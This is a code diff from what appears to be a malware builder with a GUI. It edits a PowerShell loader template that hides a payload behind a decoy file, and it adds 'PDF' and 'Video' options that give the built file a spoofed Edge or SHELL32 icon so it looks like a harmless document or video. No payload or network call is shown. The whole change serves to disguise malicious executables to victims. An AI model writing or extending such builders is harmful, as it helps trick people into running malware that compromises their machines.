@@ -21,7 +21,7 @@ $decoy_filelength = #replacemedecoylength;
 $payload_start_byte = #replacemepayloadstartbyte;
 $payload_filelength = #replacemepayloadlength;
 
-$decoy_file = "$env:temp\#replacemedecoyname";
+$decoy_file = "$env:temp\\#replacemedecoyname";
 #replacemesavedfile
 #replacemedllep
 
@@ -347,6 +347,13 @@ class MainWindow(QWidget):
         buttons2_layout.addWidget(self.mp3_button)
         displayicon_layout.addLayout(buttons2_layout)
 
+        buttons3_layout = QHBoxLayout()
+        self.pdf_button = QRadioButton("PDF")
+        self.video_button = QRadioButton("Video")
+        buttons3_layout.addWidget(self.pdf_button)
+        buttons3_layout.addWidget(self.video_button)
+        displayicon_layout.addLayout(buttons3_layout)
+
         icon_button_group = QButtonGroup()
         icon_button_group.addButton(self.doc_button)
         icon_button_group.addButton(self.txt_button)
@@ -354,6 +361,8 @@ class MainWindow(QWidget):
         icon_button_group.addButton(self.zip_button)
         icon_button_group.addButton(self.folder_button)
         icon_button_group.addButton(self.mp3_button)
+        icon_button_group.addButton(self.pdf_button)
+        icon_button_group.addButton(self.video_button)
 
         buttons_and_icon_layout.addWidget(displayicon_container)
 
@@ -375,6 +384,8 @@ class MainWindow(QWidget):
         self.zip_button.toggled.connect(self.update_icon)
         self.folder_button.toggled.connect(self.update_icon)
         self.mp3_button.toggled.connect(self.update_icon)
+        self.pdf_button.toggled.connect(self.update_icon)
+        self.video_button.toggled.connect(self.update_icon)
         self.update_icon()
 
         console_label = QLabel("Building Console")
@@ -412,6 +423,10 @@ class MainWindow(QWidget):
             pixmap = QPixmap('img/folder.ico')
         elif self.mp3_button.isChecked():
             pixmap = QPixmap('img/mp3.ico')
+        elif self.pdf_button.isChecked():
+            pixmap = QPixmap('img/pdf.ico')
+        elif self.video_button.isChecked():
+            pixmap = QPixmap('img/video.png')
 
         pixmap = pixmap.scaled(icon_size, icon_size)
         self.icon_display_label.setPixmap(pixmap)
@@ -509,6 +524,14 @@ class MainWindow(QWidget):
             icon = 'C:\\Windows\\System32\\SHELL32.dll'
             icon_index = 1
             filetype = 'Document'
+        elif self.pdf_button.isChecked():
+            icon = '%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe'
+            icon_index = 11
+            filetype = 'PDF'
+        elif self.video_button.isChecked():
+            icon = 'C:\\Windows\\System32\\SHELL32.dll'
+            icon_index = 118
+            filetype = 'Video'
         
         if payload_type == "PowerShell Script":
             loader_start_byte = 0x00003000 + decoysize + 1
